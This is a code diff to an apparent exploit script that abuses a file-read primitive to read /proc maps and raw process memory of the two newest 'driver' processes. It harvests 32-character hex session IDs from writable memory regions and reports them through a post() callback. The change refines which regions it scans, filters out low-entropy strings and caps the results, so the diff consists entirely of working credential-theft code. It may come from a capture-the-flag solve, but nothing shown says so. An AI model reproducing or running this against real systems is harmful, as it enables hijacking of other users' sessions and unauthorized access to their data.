@@ -33,11 +33,16 @@
     }));
   }
 
-  await post("drivers " + drivers.length);
+  drivers.sort((a, b) => b[0] - a[0]);
+  const activeDrivers = drivers.slice(0, 2);
+
+  await post("drivers " + drivers.length + " use " + activeDrivers.map((x) => x[0]).join("."));
 
   const sessions = [];
-  for (const [pid, port] of drivers) {
+  for (const [pid, port] of activeDrivers) {
     const maps = await read(proc + pid + "/maps%3f");
+    let reads = 0;
+
     for (const line of maps.split("\n")) {
       const parts = line.split(/ +/);
       if (!parts[1] || !parts[1].startsWith("rw")) {
@@ -45,17 +50,35 @@
       }
 
       const [start, end] = parts[0].split("-").map((x) => parseInt(x, 16));
-      if (end - start > 0x2000000) {
+      const name = parts.length >= 6 ? parts[5] : "";
+      const size = end - start;
+
+      if (size > 0x400000 && name !== "[heap]" && name !== "[stack]") {
         continue;
       }
 
       for (let off = start; off < end; off += 1500) {
         const data = await read(proc + pid + "/mem%3f?offset=0x" + off.toString(16) + "&limit=1500");
+        reads++;
+
         for (const m of data.matchAll(/[a-f0-9]{32}/g)) {
-          sessions.push([port, m[0]]);
+          const sid = m[0];
+          if (new Set(sid).size > 8 && !sessions.some((x) => x[0] === port && x[1] === sid)) {
+            sessions.push([port, sid]);
+          }
+        }
+
+        if (sessions.length > 20) {
+          break;
         }
       }
+
+      if (sessions.length > 20) {
+        break;
+      }
     }
+
+    await post("scan " + pid + " reads " + reads + " sessions " + sessions.length);
   }
 
   await post("sessions " + sessions.length);
